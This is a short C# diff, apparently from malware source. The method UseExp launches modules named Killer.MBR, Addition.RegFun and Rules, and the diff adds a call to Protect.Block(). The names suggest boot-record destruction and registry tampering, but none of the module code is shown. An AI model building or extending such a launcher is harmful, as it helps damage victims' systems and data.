@@ -8,6 +8,7 @@ namespace Crock
         // Запус всех модулей
         public static void UseExp()
         {
+            Protect.Block();
             Killer.MBR();
             Addition.RegFun();
             var rule = new Rules();
